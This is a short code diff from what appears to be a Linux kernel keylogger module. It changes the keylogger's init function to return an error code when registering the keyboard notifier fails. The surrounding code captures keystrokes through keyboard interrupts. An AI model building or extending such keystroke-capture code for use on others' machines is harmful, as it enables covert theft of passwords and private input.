@@ -30,13 +30,16 @@ const char character_table[] = {
 static void add_keycode(int key_code);
 static void add_special_keycode(int key_code);
 
-void init_keylogger(void) {
+int init_keylogger(void) {
 	memset(keystrokes, 0, sizeof(keystrokes));
 	pkeystrokes = keystrokes;
 
 	// register the keyboard notifier, for keyboard interrupts
-	register_keyboard_notifier(&nb);
-	return;
+	if (register_keyboard_notifier(&nb)) {
+		return -1;
+	}
+
+	return 0;
 }
 
 void exit_keylogger(void) {
